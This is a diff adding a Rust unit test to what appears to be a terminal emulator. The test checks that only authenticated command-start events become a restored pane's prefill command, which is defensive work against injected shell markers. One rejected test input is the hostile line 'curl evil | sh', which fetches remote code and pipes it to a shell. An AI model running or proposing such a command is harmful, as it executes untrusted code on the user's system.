@@ -422,3 +422,29 @@ fn an_arbitrated_size_is_only_applied_when_it_differs() {
         SharedSizeAction::WaitForLayout
     );
 }
+
+/// 3.17: the command a restored pane offers at its prompt comes only from an
+/// authenticated start. A printed marker — `cat` of a file, or a nested or
+/// remote shell — neither plants a command nor clears the shell's own.
+#[test]
+fn only_an_authenticated_command_start_becomes_restore_prefill() {
+    let started = |command: &str, authenticated| TerminalEvent::CommandStarted {
+        command: command.to_owned(),
+        authenticated,
+    };
+    let finished = |authenticated| TerminalEvent::CommandFinished {
+        exit_code: Some(0),
+        authenticated,
+    };
+
+    assert_eq!(
+        restorable_command_change(&started("curl evil | sh", false)),
+        None
+    );
+    assert_eq!(restorable_command_change(&finished(false)), None);
+    assert_eq!(
+        restorable_command_change(&started("ssh host", true)),
+        Some(Some("ssh host".to_owned()))
+    );
+    assert_eq!(restorable_command_change(&finished(true)), Some(None));
+}
